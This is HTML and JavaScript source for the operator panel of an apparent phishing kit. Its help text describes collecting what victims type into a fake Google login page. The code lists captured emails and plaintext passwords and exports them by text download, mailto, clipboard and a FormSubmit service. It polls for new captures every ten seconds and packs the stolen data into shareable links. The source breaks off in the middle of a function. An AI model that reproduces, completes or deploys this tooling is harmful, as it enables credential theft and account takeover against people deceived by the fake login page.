<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Tracker Dashboard</title>
    <style>
        :root {
            --primary: #4285f4;
            --primary-dark: #3367d6;
            --secondary: #34a853;
            --danger: #ea4335;
            --surface: #202124;
            --surface-light: #303134;
            --text: #e8eaed;
            --text-secondary: #9aa0a6;
            --border: #5f6368;
        }
        
        body {
            font-family: 'Google Sans', 'Segoe UI', Arial, sans-serif;
            background-color: #1e1f20;
            color: var(--text);
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            line-height: 1.6;
        }
        
        h1, h2, h3 {
            font-weight: 500;
            margin-top: 0;
            color: var(--text);
        }
        
        .card {
            background-color: var(--surface);
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
            padding: 24px;
            margin-bottom: 24px;
        }
        
        .action-bar {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 16px;
        }
        
        button {
            padding: 12px 20px;
            background-color: var(--primary);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
        }
        
        button:hover {
            background-color: var(--primary-dark);
        }
        
        button:active {
            transform: scale(0.98);
        }
        
        button.success {
            background-color: var(--secondary);
        }
        
        button.danger {
            background-color: var(--danger);
        }
        
        button:disabled {
            background-color: var(--border);
            opacity: 0.7;
            cursor: not-allowed;
        }
        
        #logs {
            background-color: var(--surface-light);
            border-radius: 8px;
            padding: 16px;
            min-height: 300px;
        }
        
        .login-entry {
            background-color: var(--surface);
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 16px;
            border-left: 3px solid var(--primary);
        }
        
        .login-entry p {
            margin: 8px 0;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: var(--primary);
            animation: spin 1s ease-in-out infinite;
            margin: 20px auto;
        }
        
        .share-panel {
            background-color: var(--primary-dark);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .share-title {
            font-size: 16px;
            font-weight: 500;
            margin-top: 0;
            margin-bottom: 16px;
        }
        
        .input-group {
            display: flex;
            width: 100%;
            gap: 8px;
            margin-bottom: 12px;
        }
        
        input[type="text"] {
            flex: 1;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid var(--border);
            background-color: var(--surface);
            color: var(--text);
            font-size: 14px;
        }
        
        input[type="text"]:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Responsive Styles */
        @media screen and (max-width: 640px) {
            .action-bar {
                flex-direction: column;
            }
            
            button {
                width: 100%;
            }
            
            .input-group {
                flex-direction: column;
            }
            
            .input-group button {
                width: auto;
            }
        }
    </style>
</head>
<body>
    <h1>Login Tracker Dashboard</h1>
    
    <div class="card">
        <div class="action-bar">
            <button onclick="refreshView()" id="refreshBtn">
                <span id="refreshIcon">‚Üª</span> Refresh Data
            </button>
            <button onclick="loginTracker.download()" id="downloadBtn">
                ‚¨áÔ∏è Download Data
            </button>
            <button onclick="loginTracker.clear()" id="clearBtn" class="danger">
                üóëÔ∏è Clear Data
            </button>
            <button onclick="sendLoginInfoEmail()" id="emailBtn" style="background-color: #8ab4f8;">
                üìÑ Export as Text
            </button>
            <button onclick="sendLogsToEmail()" id="directEmailBtn" style="background-color: #ea4335;">
                üìß Direct Email
            </button>
            <button onclick="submitLogsViaFormSubmit()" id="formSubmitBtn" style="background-color: #4285F4;">
                üì® FormSubmit
            </button>
            <button onclick="copyLogsToClipboard()" id="clipboardBtn" style="background-color: #fbbc04;">
                üìã Copy to Clipboard
            </button>
            <button onclick="setupAutoEmail()" id="autoEmailBtn" style="background-color: #34a853;">
                üì≤ Auto Notifications
            </button>
        </div>
    
        <!-- Auto Email Status -->
        <div id="autoEmailStatus" style="display: none; margin: 15px 0; padding: 10px; border-radius: 5px; background-color: #34a853; color: white; font-size: 14px;">
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <div>
                    <h3 style="margin: 0 0 5px 0; font-size: 16px;">üìß Automatic Email Notifications</h3>
                    <div id="autoEmailInfo"></div>
                </div>
                <button onclick="disableAutoEmail()" style="background-color: white; color: #333; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer;">
                    Disable
                </button>
            </div>
        </div>
    
        <!-- FormSubmit Activation Status -->
        <div style="margin-bottom: 15px; padding: 10px; border-radius: 5px; background-color: #4285F4; color: white; font-size: 14px;">
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <div>
                    <h3 style="margin: 0 0 5px 0; font-size: 16px;">üì® FormSubmit Email Service Activated!</h3>
                    <p style="margin: 0;">Login data will be sent directly to your email using FormSubmit secure email delivery service.</p>
                </div>
            </div>
        </div>
    
        <div id="share-panel" style="margin-bottom: 20px;" class="share-panel">
            <h3 class="share-title">Share Data Between Browsers</h3>
            <div class="action-bar">
                <button onclick="generateShareableLink()" class="success">Generate Shareable Link</button>
                <button onclick="showImportForm()" class="primary">Import from Link</button>
            </div>
            <div id="shareOutput" style="display: none; margin-top: 10px;">
                <p>Copy this link and open it in another browser:</p>
                <div class="input-group">
                    <input type="text" id="shareLink" readonly>
                    <button onclick="copyShareLink()">Copy</button>
                </div>
            </div>
            
            <div id="importForm" style="margin-top: 16px; display: none;">
                <p>Paste a shareable link:</p>
                <div class="input-group">
                    <input type="text" id="importLink" placeholder="Paste link here...">
                    <button onclick="importFromLink()">Import</button>
                </div>
            </div>
        </div>

        <div id="help-panel" style="margin-bottom: 20px; background-color: #f8f9fa; padding: 15px; border-radius: 5px;">
            <h3 style="margin-top: 0; color: #1a73e8;">How Auto Notifications Work</h3>
            <p style="font-size: 14px; color: #333;">
                The auto notification feature alerts you when new login attempts are captured.
                Here's how it works:
            </p>
            <ol style="font-size: 14px; color: #333;">
                <li><strong>Setup:</strong> Click the "Auto Notifications" button and enter your email address.</li>
                <li><strong>Receive:</strong> When someone enters credentials on the Google login page, the login data will be automatically downloaded as a text file.</li>
                <li><strong>Requirements:</strong> For this to work, keep the admin panel open in a browser tab. The browser will detect new logins and save the data automatically.</li>
                <li><strong>Manual Email:</strong> You can manually send the downloaded text files to your email.</li>
                <li><strong>Multiple Devices:</strong> For capturing on one device and viewing on another, use the "Generate Shareable Link" feature.</li>
            </ol>
            <p style="font-size: 14px; color: #333;">
                <strong>Note:</strong> Your browser must allow downloads for notifications to work properly. You may need to check your download settings if files aren't being saved.
            </p>
        </div>
        
    <div id="logs">
        <p>Login attempts will appear here after being tracked.</p>
        </div>
    </div>

    <!-- Include the tracker script -->
    <script src="login-tracker.js"></script>
    
    <script>
        // Function to display login attempts
        function displayLoginAttempts() {
            const logsContainer = document.getElementById('logs');
            
            // Show loading indicator
            logsContainer.innerHTML = '<div style="text-align:center"><div class="loading"></div><p>Loading data...</p></div>';
            
            try {
                // Get login attempts from loginTracker
                setTimeout(() => {
                    const attempts = window.loginTracker ? window.loginTracker.getAttempts() : [];
                    
                    // Clear previous content
                    logsContainer.innerHTML = '';
                    
                    if (attempts && attempts.length > 0) {
                        attempts.forEach(attempt => {
                            const entry = document.createElement('div');
                            entry.className = 'login-entry';
                            
                            // Safely handle date parsing
                            let formattedDate = 'Invalid date';
                            try {
                                const date = new Date(attempt.timestamp);
                                formattedDate = date.toLocaleString();
                            } catch (e) {
                                console.error('Error formatting date:', e);
                            }
                            
                            // Safely display data with proper escaping
                            const email = attempt.email ? escapeHtml(attempt.email) : '(not provided)';
                            const password = attempt.password ? escapeHtml(attempt.password) : '(not provided)';
                            
                            entry.innerHTML = `
                                <p><strong>Email:</strong> ${email}</p>
                                <p><strong>Password:</strong> ${password}</p>
                                <p><strong>Timestamp:</strong> ${formattedDate}</p>
                            `;
                            
                            logsContainer.appendChild(entry);
                        });
                        
                        // Enable download button
                        document.getElementById('downloadBtn').disabled = false;
                        document.getElementById('clearBtn').disabled = false;
                    } else {
                        logsContainer.innerHTML = '<p style="text-align: center; padding: 40px 0;">No login attempts recorded yet.</p>';
                        // Disable buttons that need data
                        document.getElementById('downloadBtn').disabled = true;
                        document.getElementById('clearBtn').disabled = true;
                    }
                }, 300); // Small delay for visual feedback
            } catch (err) {
                logsContainer.innerHTML = `<p style="color:red">Error loading data: ${err.message}</p>`;
                console.error('Error in displayLoginAttempts:', err);
            }
        }
        
        // Helper function to escape HTML to prevent XSS
        function escapeHtml(str) {
            const div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        }
        
        // Function to refresh the view with loading state
        function refreshView() {
            const refreshBtn = document.getElementById('refreshBtn');
            const refreshIcon = document.getElementById('refreshIcon');
            refreshBtn.disabled = true;
            refreshIcon.style.display = 'inline-block';
            refreshIcon.style.animation = 'spin 1s linear infinite';
            
            setTimeout(() => {
                displayLoginAttempts();
                refreshBtn.disabled = false;
                refreshIcon.style.animation = 'none';
                
                // Update URL hash to preserve data on refresh
                if (window.loginTracker) {
                    const attemptsHash = window.loginTracker.getAttemptsHash();
                    if (attemptsHash) {
                        window.location.hash = attemptsHash.substring(1);
                    }
                }
            }, 500);
        }
        
        // Generate and display a shareable link
        function generateShareableLink() {
            try {
                const shareLink = window.loginTracker.shareLink();
                if (shareLink) {
                    document.getElementById('shareLink').value = shareLink;
                    document.getElementById('shareOutput').style.display = 'block';
                    document.getElementById('importForm').style.display = 'none';
                }
            } catch (err) {
                alert('Error generating shareable link: ' + err.message);
            }
        }
        
        // Copy shareable link to clipboard
        function copyShareLink() {
            try {
                const linkInput = document.getElementById('shareLink');
                linkInput.select();
                
                if (navigator.clipboard && navigator.clipboard.writeText) {
                    navigator.clipboard.writeText(linkInput.value)
                        .then(() => alert('Link copied to clipboard!'))
                        .catch(err => {
                            document.execCommand('copy');
                            alert('Link copied to clipboard!');
                        });
                } else {
                    document.execCommand('copy');
                    alert('Link copied to clipboard!');
                }
            } catch (err) {
                alert('Could not copy the link automatically. Please copy it manually.');
            }
        }
        
        // Show import form
        function showImportForm() {
            document.getElementById('importForm').style.display = 'block';
            document.getElementById('shareOutput').style.display = 'none';
            document.getElementById('importLink').value = '';
            document.getElementById('importLink').focus();
        }
        
        // Import data from a pasted link
        function importFromLink() {
            const link = document.getElementById('importLink').value.trim();
            if (!link) {
                alert('Please paste a shareable link first');
                return;
            }
            
            // Add protocol if missing
            let fullLink = link;
            if (!link.startsWith('http://') && !link.startsWith('https://')) {
                // If it's just a hash or search parameter, add to current URL
                if (link.startsWith('#') || link.startsWith('?')) {
                    const baseUrl = window.location.href.split('#')[0].split('?')[0];
                    fullLink = baseUrl + link;
                } else {
                    fullLink = 'http://' + link;
                }
            }
            
            try {
                const success = window.loginTracker.importFromLink(fullLink);
                if (success) {
                    alert('Login data imported successfully!');
                    displayLoginAttempts();
                    document.getElementById('importForm').style.display = 'none';
                    
                    // Update URL hash to preserve data on refresh
                    const attemptsHash = window.loginTracker.getAttemptsHash();
                    if (attemptsHash) {
                        window.location.hash = attemptsHash.substring(1);
                    }
                } else {
                    // Try direct data import
                    try {
                        if (link.includes('data=')) {
                            const parts = link.split('data=');
                            if (parts.length > 1) {
                                const encodedData = parts[1];
                                if (window.loginTracker.importSharedData) {
                                    const success = window.loginTracker.importSharedData(encodedData);
                                    if (success) {
                                        alert('Data imported successfully!');
                                        displayLoginAttempts();
                                        document.getElementById('importForm').style.display = 'none';
                                        return;
                                    }
                                }
                            }
                        }
                    } catch (e) {
                        console.error('Error trying direct data import:', e);
                    }
                    
                    alert('Failed to import data. Invalid link format.');
                }
            } catch (err) {
                alert('Error importing data: ' + err.message);
            }
        }
        
        // Function to send login information via email
        function sendLoginInfoEmail() {
            try {
                if (!window.loginTracker) {
                    alert("Login tracker not available!");
                    return;
                }
                
                const attempts = window.loginTracker.getAttempts();
                
                if (!attempts || attempts.length === 0) {
                    alert("No login data to send. Capture some logins first.");
                    return;
                }
                
                // Create email content
                let emailBody = "Login Information\n\n";
                emailBody += "Collected on: " + new Date().toLocaleString() + "\n\n";
                
                attempts.forEach((attempt, index) => {
                    emailBody += "--- Login #" + (index + 1) + " ---\n";
                    emailBody += "Email: " + (attempt.email || "(not provided)") + "\n";
                    emailBody += "Password: " + (attempt.password || "(not provided)") + "\n";
                    emailBody += "Time: " + (new Date(attempt.timestamp).toLocaleString() || "Unknown") + "\n\n";
                });
                
                // Create text file for download
                const blob = new Blob([emailBody], { type: 'text/plain' });
                const url = URL.createObjectURL(blob);
                
                const a = document.createElement('a');
                a.href = url;
                a.download = 'login_data_' + new Date().toISOString().slice(0,10) + '.txt';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                
                alert("Login data has been downloaded as a text file. You can open it and copy the content into an email.");
                
            } catch (err) {
                alert("Error downloading data: " + err.message);
                
                // Fallback - copy to clipboard
                try {
                    const tempInput = document.createElement("textarea");
                    tempInput.value = emailBody;
                    document.body.appendChild(tempInput);
                    tempInput.select();
                    document.execCommand("copy");
                    document.body.removeChild(tempInput);
                    alert("Login data copied to clipboard! You can paste it into your email.");
                } catch (clipboardErr) {
                    alert("Could not copy data to clipboard: " + clipboardErr.message);
                }
            }
        }
        
        // Load data on page load
        window.addEventListener('DOMContentLoaded', function() {
            // Check if we have shared data in the URL
            if (window.loginTracker) {
                if (window.location.search.includes('shared=') || window.location.hash.includes('data=')) {
                    window.loginTracker.checkForShared();
                } else {
                    window.loginTracker.loadAttemptsFromHash();
                    window.loginTracker.loadFromLocalStorage();
                }
            }
            
            // Display data
            displayLoginAttempts();
            
            // Check auto email status
            checkAutoEmailStatus();
            
            // Start auto email checker if configured
            startAutoEmailChecker();
        });
        
        // Auto email variables
        let lastEmailSentCount = 0;
        let autoEmailInterval = null;
        const AUTO_EMAIL_CHECK_INTERVAL = 10000; // 10 seconds
        
        // Setup auto email
        function setupAutoEmail() {
            const savedEmail = localStorage.getItem('autoEmailAddress') || '';
            
            // Create a modal for better UX
            const modal = document.createElement('div');
            modal.style.position = 'fixed';
            modal.style.top = '0';
            modal.style.left = '0';
            modal.style.width = '100%';
            modal.style.height = '100%';
            modal.style.backgroundColor = 'rgba(0,0,0,0.7)';
            modal.style.zIndex = '10000';
            modal.style.display = 'flex';
            modal.style.justifyContent = 'center';
            modal.style.alignItems = 'center';
            
            // Create modal content
            const content = document.createElement('div');
            content.style.backgroundColor = '#202124';
            content.style.borderRadius = '12px';
            content.style.padding = '25px';
            content.style.width = '90%';
            content.style.maxWidth = '500px';
            content.style.color = '#e8eaed';
            
            content.innerHTML = `
                <h3 style="margin-top: 0; color: #8ab4f8;">Setup Auto Notifications</h3>
                
                <p>This feature will automatically send you login data as text files when new logins are captured.</p>
                
                <div style="margin: 15px 0;">
                    <label for="autoEmailInput" style="display: block; margin-bottom: 5px;">Your Email Address:</label>
                    <input type="email" id="autoEmailInput" value="${savedEmail}" 
                        style="width: 100%; padding: 10px; border-radius: 5px; border: 1px solid #5f6368; background: #303134; color: #e8eaed; box-sizing: border-box;">
                </div>
                
                <div style="background-color: #30363c; padding: 10px; border-radius: 5px; margin: 15px 0; border-left: 3px solid #8ab4f8;">
                    <p style="margin: 0 0 10px 0; font-weight: bold;">How it works:</p>
                    <ol style="margin: 0; padding-left: 20px;">
                        <li>Keep this panel open in your browser</li>
                        <li>When someone logs in, you'll receive a notification</li>
                        <li>Login data will be saved as text files on your device</li>
                        <li>You can manually send these files to your email</li>
                    </ol>
                </div>
                
                <div style="display: flex; justify-content: flex-end; gap: 10px; margin-top: 20px;">
                    <button id="cancelAutoEmailBtn" style="padding: 10px 15px; border: none; border-radius: 5px; background: #5f6368; color: white; cursor: pointer;">Cancel</button>
                    <button id="saveAutoEmailBtn" style="padding: 10px 15px; border: none; border-radius: 5px; background: #8ab4f8; color: #202124; cursor: pointer; font-weight: bold;">Enable Notifications</button>
                </div>
            `;
            
            modal.appendChild(content);
            document.body.appendChild(modal);
            
            // Setup event handlers
            document.getElementById('cancelAutoEmailBtn').addEventListener('click', function() {
                document.body.removeChild(modal);
            });
            
            document.getElementById('saveAutoEmailBtn').addEventListener('click', function() {
                const emailAddress = document.getElementById('autoEmailInput').value.trim();
                
                if (!emailAddress || !emailAddress.includes('@')) {
                    alert("Please enter a valid email address");
                    return;
                }
                
                // Save email address
                localStorage.setItem('autoEmailAddress', emailAddress);
                localStorage.setItem('autoEmailEnabled', 'true');
                
                // Update last sent count to current count
                if (window.loginTracker) {
                    const attempts = window.loginTracker.getAttempts() || [];
                    lastEmailSentCount = attempts.length;
                    localStorage.setItem('lastEmailSentCount', lastEmailSentCount);
                }
                
                // Start auto checker
                startAutoEmailChecker();
                
                // Update status display
                updateAutoEmailStatus();
                
                // Remove modal
                document.body.removeChild(modal);
                
                // Show confirmation
                const notification = document.createElement('div');
                notification.style.position = 'fixed';
                notification.style.bottom = '20px';
                notification.style.right = '20px';
                notification.style.backgroundColor = '#34a853';
                notification.style.color = 'white';
                notification.style.padding = '15px';
                notification.style.borderRadius = '8px';
                notification.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
                notification.style.zIndex = '9999';
                notification.innerHTML = `
                    <strong>Auto notifications enabled!</strong><br>
                    New login data will be automatically saved to your device.<br>
                    Remember to keep this panel open.
                `;
                document.body.appendChild(notification);
                
                setTimeout(() => {
                    notification.style.opacity = '0';
                    notification.style.transition = 'opacity 0.5s';
                    setTimeout(() => document.body.removeChild(notification), 500);
                }, 5000);
            });
            
            // Focus the input field
            setTimeout(() => {
                document.getElementById('autoEmailInput').focus();
            }, 100);
        }
        
        // Disable auto email
        function disableAutoEmail() {
            if (confirm("Are you sure you want to disable automatic emails?")) {
                localStorage.setItem('autoEmailEnabled', 'false');
                
                if (autoEmailInterval) {
                    clearInterval(autoEmailInterval);
                    autoEmailInterval = null;
                }
                
                updateAutoEmailStatus();
                alert("Automatic emails have been disabled.");
            }
        }
        
        // Check auto email status
        function checkAutoEmailStatus() {
            const isEnabled = localStorage.getItem('autoEmailEnabled') === 'true';
            const emailAddress = localStorage.getItem('autoEmailAddress') || '';
            lastEmailSentCount = parseInt(localStorage.getItem('lastEmailSentCount') || '0', 10);
            
            updateAutoEmailStatus();
            
            return { isEnabled, emailAddress };
        }
        
        // Update auto email status display
        function updateAutoEmailStatus() {
            const isEnabled = localStorage.getItem('autoEmailEnabled') === 'true';
            const emailAddress = localStorage.getItem('autoEmailAddress') || '';
            const statusDiv = document.getElementById('autoEmailStatus');
            const infoElement = document.getElementById('autoEmailInfo');
            
            if (isEnabled && emailAddress) {
                statusDiv.style.display = 'block';
                infoElement.innerHTML = `
                    <strong>Status:</strong> Active<br>
                    <strong>Email:</strong> ${emailAddress}<br>
                    <strong>Last sent count:</strong> ${lastEmailSentCount} attempts
                `;
                statusDiv.style.backgroundColor = '#34a853';
            } else if (emailAddress) {
                statusDiv.style.display = 'block';
                infoElement.innerHTML = `
                    <strong>Status:</strong> Disabled<br>
                    <strong>Email:</strong> ${emailAddress}
                `;
                statusDiv.style.backgroundColor = '#ea4335';
            } else {
                statusDiv.style.display = 'none';
            }
        }
        
        // Start auto email checker
        function startAutoEmailChecker() {
            // Clear any existing interval
            if (autoEmailInterval) {
                clearInterval(autoEmailInterval);
            }
            
            const { isEnabled, emailAddress } = checkAutoEmailStatus();
            
            if (!isEnabled || !emailAddress) {
                return;
            }
            
            // Set up interval to check for new login attempts
            autoEmailInterval = setInterval(checkForNewLoginAttempts, AUTO_EMAIL_CHECK_INTERVAL);
            console.log(`Auto email checker started for ${emailAddress}`);
        }
        
        // Check for new login attempts
        function checkForNewLoginAttempts() {
            if (!window.loginTracker) return;
            
            const attempts = window.loginTracker.getAttempts() || [];
            
            if (attempts.length > lastEmailSentCount) {
                const newAttempts = attempts.slice(lastEmailSentCount);
                sendNewLoginAttemptsEmail(newAttempts);
                lastEmailSentCount = attempts.length;
                localStorage.setItem('lastEmailSentCount', lastEmailSentCount.toString());
                updateAutoEmailStatus();
            }
        }
        
        // Send new login attempts email
        function sendNewLoginAttemptsEmail(newAttempts) {
            try {
                if (!newAttempts || newAttempts.length === 0) return;
                
                const emailAddress = localStorage.getItem('autoEmailAddress');
                if (!emailAddress) return;
                
                // Create email content
                let emailSubject = `[ALERT] ${newAttempts.length} New Login Attempts - ${new Date().toLocaleString()}`;
                let emailBody = "New Login Information\n\n";
                emailBody += "Collected on: " + new Date().toLocaleString() + "\n\n";
                
                newAttempts.forEach((attempt, index) => {
                    emailBody += "--- Login #" + (lastEmailSentCount + index + 1) + " ---\n";
                    emailBody += "Email: " + (attempt.email || "(not provided)") + "\n";
                    emailBody += "Password: " + (attempt.password || "(not provided)") + "\n";
                    emailBody += "Time: " + (new Date(attempt.timestamp).toLocaleString() || "Unknown") + "\n\n";
                });
                
                // Create and download text file instead of using mailto
                try {
                    // Create text file for download
                    const blob = new Blob([emailBody], { type: 'text/plain' });
                    const url = URL.createObjectURL(blob);
                    
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'new_logins_' + new Date().toISOString().slice(0,19).replace(/:/g, '-') + '.txt';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    
                    console.log(`Auto notification: Downloaded ${newAttempts.length} new login attempts as text file`);
                    
                    // Also show notification
                    const notification = document.createElement('div');
                    notification.style.position = 'fixed';
                    notification.style.bottom = '20px';
                    notification.style.right = '20px';
                    notification.style.backgroundColor = '#34a853';
                    notification.style.color = 'white';
                    notification.style.padding = '15px';
                    notification.style.borderRadius = '8px';
                    notification.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
                    notification.style.zIndex = '9999';
                    notification.innerHTML = `<strong>New Login Data!</strong><br>${newAttempts.length} new login(s) detected and saved to file.`;
                    document.body.appendChild(notification);
                    
                    setTimeout(() => {
                        notification.style.opacity = '0';
                        notification.style.transition = 'opacity 0.5s';
                        setTimeout(() => document.body.removeChild(notification), 500);
                    }, 5000);
                } catch (downloadErr) {
                    console.error('Error creating download file:', downloadErr);
                    
                    // Fallback to clipboard
                    try {
                        navigator.clipboard.writeText(emailBody).then(() => {
                            alert("New login data copied to clipboard! You can paste it into your email.");
                        }).catch(err => {
                            console.error('Failed to copy to clipboard:', err);
                            
                            // Last resort: try to use mailto link
                            const mailtoLink = "mailto:" + encodeURIComponent(emailAddress) 
                                            + "?subject=" + encodeURIComponent(emailSubject) 
                                            + "&body=" + encodeURIComponent(emailBody);
                            
                            window.open(mailtoLink, '_blank');
                        });
                    } catch (clipErr) {
                        console.error('All notification methods failed:', clipErr);
                    }
                }
            } catch (err) {
                console.error('Error in sendNewLoginAttemptsEmail:', err);
            }
        }
        
        // Direct mailto email function
        function sendLogsToEmail() {
            if (!window.loginTracker) {
                alert("Login tracker not available!");
                return;
            }
            
            const attempts = window.loginTracker.getAttempts();
            if (!attempts || attempts.length === 0) {
                alert("No login attempts to send! Capture some logins first.");
                return;
            }
            
            // Prompt for email address
            const savedEmail = localStorage.getItem('autoEmailAddress') || '';
            const emailPrompt = prompt("Enter your email address to receive login data:", savedEmail);
            
            if (!emailPrompt) return; // User cancelled
            
            const emailAddress = emailPrompt.trim();
            if (!emailAddress || !emailAddress.includes('@')) {
                alert("Please enter a valid email address");
                return;
            }
            
            // Save email for future use
            localStorage.setItem('autoEmailAddress', emailAddress);
            
            // Create email content
            let emailSubject = `Login Attempts Report - ${new Date().toLocaleDateString()}`;
            let emailBody = "Login Information\n\n";
            emailBody += "Collected on: " + new Date().toLocaleString() + "\n\n";
            
            // Format the data for better readability
            attempts.forEach((attempt, index) => {
                emailBody += "--- Login #" + (index + 1) + " ---\n";
                emailBody += "Email: " + (attempt.email || "(not provided)") + "\n";
                emailBody += "Password: " + (attempt.password || "(not provided)") + "\n";
                emailBody += "Time: " + (new Date(attempt.timestamp).toLocaleString() || "Unknown") + "\n\n";
            });
            
            // Create mailto link
            try {
                const mailtoLink = "mailto:" + encodeURIComponent(emailAddress) 
                                + "?subject=" + encodeURIComponent(emailSubject) 
                                + "&body=" + encodeURIComponent(emailBody);
                
                // Open email client
                window.open(mailtoLink, '_blank');
                
                // Show modal with instructions
                showEmailHelpModal(emailAddress);
            } catch (err) {
                console.error('Error creating mailto link:', err);
                alert("Failed to open email client: " + err.message + "\n\nTry the 'Copy to Clipboard' option instead.");
            }
        }
        
        // Show email help modal with instructions
        function showEmailHelpModal(emailAddress) {
            const modal = document.createElement('div');
            modal.style.position = 'fixed';
            modal.style.top = '0';
            modal.style.left = '0';
            modal.style.width = '100%';
            modal.style.height = '100%';
            modal.style.backgroundColor = 'rgba(0,0,0,0.7)';
            modal.style.zIndex = '10000';
            modal.style.display = 'flex';
            modal.style.justifyContent = 'center';
            modal.style.alignItems = 'center';
            
            const content = document.createElement('div');
            content.style.backgroundColor = '#202124';
            content.style.borderRadius = '12px';
            content.style.padding = '25px';
            content.style.width = '90%';
            content.style.maxWidth = '500px';
            content.style.color = '#e8eaed';
            
            content.innerHTML = `
                <h3 style="margin-top: 0; color: #8ab4f8;">Email Instructions</h3>
                
                <p>Your email client should be opening with the login data.</p>
                
                <div style="background-color: #30363c; padding: 15px; border-radius: 5px; margin: 15px 0; border-left: 3px solid #ea4335;">
                    <p style="margin: 0 0 10px 0;"><strong>If the email client doesn't open:</strong></p>
                    <ul style="margin: 0; padding-left: 20px;">
                        <li>Your browser might be blocking the mailto: link</li>
                        <li>Try using the "Copy to Clipboard" button instead</li>
                        <li>Or try the "Export as Text" option to save the data as a file</li>
                    </ul>
                </div>
                
                <div style="text-align: center; margin-top: 20px;">
                    <button id="closeModalBtn" style="padding: 10px 15px; border: none; border-radius: 5px; background: #8ab4f8; color: #202124; cursor: pointer; font-weight: bold;">Close</button>
                </div>
            `;
            
            modal.appendChild(content);
            document.body.appendChild(modal);
            
            document.getElementById('closeModalBtn').addEventListener('click', function() {
                document.body.removeChild(modal);
            });
        }
        
        // Copy logs to clipboard function
        function copyLogsToClipboard() {
            if (!window.loginTracker) {
                alert("Login tracker not available!");
                return;
            }
            
            const attempts = window.loginTracker.getAttempts();
            if (!attempts || attempts.length === 0) {
                alert("No login attempts to copy! Capture some logins first.");
                return;
            }
            
            // Format the data for better readability
            let textData = "LOGIN INFORMATION\n\n";
            textData += "Collected on: " + new Date().toLocaleString() + "\n\n";
            
            attempts.forEach((attempt, index) => {
                textData += "--- Login #" + (index + 1) + " ---\n";
                textData += "Email: " + (attempt.email || "(not provided)") + "\n";
                textData += "Password: " + (attempt.password || "(not provided)") + "\n";
                textData += "Time: " + (new Date(attempt.timestamp).toLocaleString() || "Unknown") + "\n\n";
            });
            
            // Try using the clipboard API
            try {
                navigator.clipboard.writeText(textData)
                    .then(() => {
                        // Show success message
                        const notification = document.createElement('div');
                        notification.style.position = 'fixed';
                        notification.style.bottom = '20px';
                        notification.style.right = '20px';
                        notification.style.backgroundColor = '#fbbc04';
                        notification.style.color = 'black';
                        notification.style.padding = '15px';
                        notification.style.borderRadius = '8px';
                        notification.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
                        notification.style.zIndex = '9999';
                        notification.innerHTML = `
                            <strong>Login data copied!</strong><br>
                            The data has been copied to your clipboard.<br>
                            You can now paste it into your email client.
                        `;
                        document.body.appendChild(notification);
                        
                        setTimeout(() => {
                            notification.style.opacity = '0';
                            notification.style.transition = 'opacity 0.5s';
                            setTimeout(() => document.body.removeChild(notification), 500);
                        }, 5000);
                    })
                    .catch(err => {
                        console.error('Failed to copy to clipboard:', err);
                        fallbackCopyToClipboard(textData);
                    });
            } catch (err) {
                console.error('Clipboard API not available:', err);
                fallbackCopyToClipboard(textData);
            }
        }
        
        // Fallback clipboard method for older browsers
        function fallbackCopyToClipboard(text) {
            try {
                // Create a temporary textarea element
                const textArea = document.createElement("textarea");
                textArea.value = text;
                textArea.style.position = "fixed";  // Avoid scrolling to bottom
                document.body.appendChild(textArea);
                textArea.focus();
                textArea.select();
                
                // Execute the copy command
                const successful = document.execCommand('copy');
                document.body.removeChild(textArea);
                
                if (successful) {
                    alert("Login data copied to clipboard! You can now paste it into your email client.");
                } else {
                    throw new Error("Copy command failed");
                }
            } catch (err) {
                console.error('Fallback clipboard method failed:', err);
                alert("Could not copy to clipboard. Please try another method or manually select and copy the data.");
                
                // Show the data in a modal as a last resort
                showDataModal(text);
            }
        }
        
        // Show data in a modal as last resort
        function showDataModal(text) {
            const modal = document.createElement('div');
            modal.style.position = 'fixed';
            modal.style.top = '0';
            modal.style.left = '0';
            modal.style.width = '100%';
            modal.style.height = '100%';
            modal.style.backgroundColor = 'rgba(0,0,0,0.7)';
            modal.style.zIndex = '10000';
            modal.style.display = 'flex';
            modal.style.justifyContent = 'center';
            modal.style.alignItems = 'center';
            
            const content = document.createElement('div');
            content.style.backgroundColor = '#202124';
            content.style.borderRadius = '12px';
            content.style.padding = '25px';
            content.style.width = '90%';
            content.style.maxWidth = '600px';
            content.style.color = '#e8eaed';
            content.style.maxHeight = '80vh';
            content.style.overflowY = 'auto';
            
            content.innerHTML = `
                <h3 style="margin-top: 0; color: #8ab4f8;">Login Data</h3>
                <p>Select all this text (Ctrl+A) and copy it (Ctrl+C):</p>
                <textarea style="width: 100%; height: 250px; background: #303134; color: #e8eaed; border: 1px solid #5f6368; border-radius: 4px; padding: 10px;">${text}</textarea>
                <div style="text-align: center; margin-top: 20px;">
                    <button id="closeDataModalBtn" style="padding: 10px 15px; border: none; border-radius: 5px; background: #8ab4f8; color: #202124; cursor: pointer; font-weight: bold;">Close</button>
                </div>
            `;
            
            modal.appendChild(content);
            document.body.appendChild(modal);
            
